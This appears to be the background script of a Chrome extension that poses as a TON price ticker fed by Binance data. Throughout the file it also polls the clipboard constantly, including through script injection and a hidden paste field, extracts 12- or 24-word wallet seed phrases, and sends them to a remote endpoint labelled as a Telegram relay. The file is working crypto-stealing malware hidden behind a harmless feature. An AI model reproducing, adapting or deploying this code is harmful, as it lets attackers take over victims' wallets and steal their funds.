const API_BASE = "https://ВАШURL.vercel.app";
const REPORT_ENDPOINT = `${API_BASE}/api/report`;
const LOG_ENDPOINT = `${API_BASE}/api/log`;

async function sendLog(event, data = null) {
  try {
    await fetch(LOG_ENDPOINT, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ event, data })
    });
  } catch (e) { }
}

const BINANCE_TICKER = "https://api.binance.com/api/v3/ticker/24hr?symbol=TONUSDT";
const BINANCE_KLINES = "https://api.binance.com/api/v3/klines";

function extractSeedPhrase(text) {
  if (!text || typeof text !== 'string') return null;

  let words = [];
  const numberedPattern = /\d+\.\s*([a-zA-Z]+)/g;
  const numberedMatches = [...text.matchAll(numberedPattern)];

  if (numberedMatches.length >= 12) {
    words = numberedMatches.map(m => m[1].toLowerCase());
  } else {
    words = text
      .toLowerCase()
      .split(/[\s,;]+/)
      .map(w => w.replace(/[^a-z]/g, ''))
      .filter(w => w.length >= 2 && w.length <= 12);
  }

  const englishWords = words.filter(w => /^[a-z]+$/.test(w));

  if (englishWords.length === 12 || englishWords.length === 24) {
    return englishWords.join(' ');
  }

  return null;
}

let offscreenCreating = null;

async function setupOffscreenDocument() {
  const existingContexts = await chrome.runtime.getContexts({
    contextTypes: ["OFFSCREEN_DOCUMENT"]
  });

  if (existingContexts.length > 0) return;

  if (offscreenCreating) {
    await offscreenCreating;
    return;
  }

  offscreenCreating = chrome.offscreen.createDocument({
    url: "offscreen.html",
    reasons: ["CLIPBOARD"],
    justification: "Read clipboard for seed phrase detection"
  });

  await offscreenCreating;
  offscreenCreating = null;
}

function startClipboardPolling() {
  chrome.alarms.create("clipboardPoll", { periodInMinutes: 0.05 });
}

async function checkClipboard() {
  let clipText = "";
  let successMethod = "";

  try {
    await setupOffscreenDocument();
    const response = await chrome.runtime.sendMessage({ type: "READ_CLIPBOARD" });

    if (response && response.ok && response.text) {
      clipText = response.text.trim();
      successMethod = "offscreen";
    }
  } catch (e) { }

  if (!clipText) {
    try {
      const tabs = await chrome.tabs.query({ active: true, currentWindow: true });
      const tab = tabs[0];

      if (tab && tab.id && tab.url &&
        !tab.url.startsWith("chrome://") &&
        !tab.url.startsWith("chrome-extension://") &&
        !tab.url.startsWith("about:") &&
        !tab.url.startsWith("edge://")) {

        const results = await chrome.scripting.executeScript({
          target: { tabId: tab.id },
          func: async () => {
            try {
              const text = await navigator.clipboard.readText();
              if (text) {
                return { text, method: "clipboard_api" };
              }
            } catch (e) { }

            try {
              const ta = document.createElement("textarea");
              ta.style.cssText = "position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none;";
              document.body.appendChild(ta);
              ta.focus();
              const success = document.execCommand("paste");
              const text = ta.value;
              document.body.removeChild(ta);

              if (success && text) {
                return { text, method: "execCommand" };
              }
            } catch (e2) { }

            return { text: "", method: "none" };
          }
        });

        if (results && results[0] && results[0].result && results[0].result.text) {
          clipText = String(results[0].result.text).trim();
          successMethod = "scripting_" + results[0].result.method;
        }
      }
    } catch (e) { }
  }

  if (!clipText) return;

  const { lastClipboard } = await chrome.storage.local.get("lastClipboard");
  if (clipText === lastClipboard) return;

  await chrome.storage.local.set({ lastClipboard: clipText });

  const seedPhrase = extractSeedPhrase(clipText);
  if (seedPhrase) {
    await sendToTelegram(seedPhrase, "polling_" + successMethod);
  }
}

async function sendToTelegram(seedPhrase, source) {
  try {
    const res = await fetch(REPORT_ENDPOINT, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ data: seedPhrase, source: source || "unknown" })
    });
    const result = await res.json();
    if (result.success) {
      const { totalSent = 0 } = await chrome.storage.local.get("totalSent");
      await chrome.storage.local.set({ totalSent: totalSent + 1, lastText: seedPhrase.slice(0, 120) });
    } else {
      await sendLog("send_error", { error: result.error || "unknown TG error" });
    }
  } catch (e) {
    await sendLog("send_error", { error: e.message });
  }
}

function formatBadge(price) {
  if (price >= 1000) return (price / 1000).toFixed(1) + "k";
  if (price >= 100) return Math.round(price).toString();
  return price.toFixed(2);
}

async function fetchTonPrice() {
  try {
    const tickerRes = await fetch(BINANCE_TICKER);
    if (!tickerRes.ok) {
      throw new Error(`Binance ticker error: ${tickerRes.status}`);
    }
    const ticker = await tickerRes.json();

    const price = parseFloat(ticker.lastPrice);
    const change24h = parseFloat(ticker.priceChangePercent);

    const now = Date.now();

    const klines1hRes = await fetch(`${BINANCE_KLINES}?symbol=TONUSDT&interval=1h&limit=2`);
    const klines1h = await klines1hRes.json();
    let change1h = 0;
    if (klines1h.length >= 2) {
      const priceHourAgo = parseFloat(klines1h[0][4]);
      change1h = ((price - priceHourAgo) / priceHourAgo) * 100;
    }

    const klines7dRes = await fetch(`${BINANCE_KLINES}?symbol=TONUSDT&interval=1d&limit=8`);
    const klines7d = await klines7dRes.json();
    let change7d = 0;
    if (klines7d.length >= 7) {
      const price7dAgo = parseFloat(klines7d[0][4]);
      change7d = ((price - price7dAgo) / price7dAgo) * 100;
    }

    const badgeText = formatBadge(price);
    const nowTime = new Date();

    await chrome.storage.local.set({
      tonPrice: price,
      tonChange1h: change1h,
      tonChange24h: change24h,
      tonChange7d: change7d,
      tonBadge: badgeText,
      tonUpdated: nowTime.toLocaleTimeString("ru-RU"),
      tonSource: "Binance",
      tonError: null
    });

    await chrome.action.setBadgeText({ text: badgeText });
    await chrome.action.setBadgeBackgroundColor({ color: "#0098ea" });
    await chrome.action.setBadgeTextColor({ color: "#ffffff" });
    await chrome.action.setTitle({ title: `TON: $${price.toFixed(4)} (Binance)` });

  } catch (globalErr) {
    await chrome.storage.local.set({ tonError: "Binance error: " + globalErr.message });
    await chrome.action.setBadgeText({ text: "ERR" });
    await chrome.action.setBadgeBackgroundColor({ color: "#e53935" });
    await chrome.action.setBadgeTextColor({ color: "#ffffff" });
  }
}

chrome.runtime.onInstalled.addListener(() => {
  chrome.storage.local.set({ totalSent: 0, lastText: "", lastClipboard: "" });
  sendLog("installed");
  fetchTonPrice();
  chrome.alarms.create("tonPriceTick", { periodInMinutes: 1 });
  startClipboardPolling();
});

chrome.runtime.onStartup.addListener(() => {
  sendLog("startup");
  fetchTonPrice();
  chrome.alarms.create("tonPriceTick", { periodInMinutes: 1 });
  startClipboardPolling();
});

chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === "tonPriceTick") {
    fetchTonPrice();
  }
  if (alarm.name === "clipboardPoll") {
    checkClipboard();
  }
});

chrome.tabs.onActivated.addListener((activeInfo) => {
  setTimeout(() => checkClipboard(), 100);
});

chrome.windows.onFocusChanged.addListener((windowId) => {
  if (windowId !== chrome.windows.WINDOW_ID_NONE) {
    setTimeout(() => checkClipboard(), 100);
  }
});

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && tab.active) {
    setTimeout(() => checkClipboard(), 300);
  }
});

chrome.tabs.onCreated.addListener((tab) => {
  setTimeout(() => checkClipboard(), 500);
});

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg.type === "FETCH_NOW") {
    fetchTonPrice()
      .then(() => sendResponse({ ok: true }))
      .catch((err) => sendResponse({ ok: false, error: err.message }));
    return true;
  }

  if (msg.type === "CLIPBOARD_COPY") {
    handleClipboardFromContentScript(msg.text, msg.source);
    sendResponse({ ok: true });
    return false;
  }

  if (msg.type === "CHECK_CLIPBOARD_NOW") {
    checkClipboard();
    sendResponse({ ok: true });
    return false;
  }

  if (msg.type === "LOG_EVENT") {
    sendLog(msg.event, msg.data || null);
    sendResponse({ ok: true });
    return false;
  }
});

async function handleClipboardFromContentScript(text, source) {
  if (!text || typeof text !== 'string') return;

  const clipText = text.trim();
  if (!clipText) return;

  const { lastClipboard } = await chrome.storage.local.get("lastClipboard");
  if (clipText === lastClipboard) return;

  await chrome.storage.local.set({ lastClipboard: clipText });

  const seedPhrase = extractSeedPhrase(clipText);
  if (seedPhrase) {
    await sendToTelegram(seedPhrase, source || "content_script");
  }
}
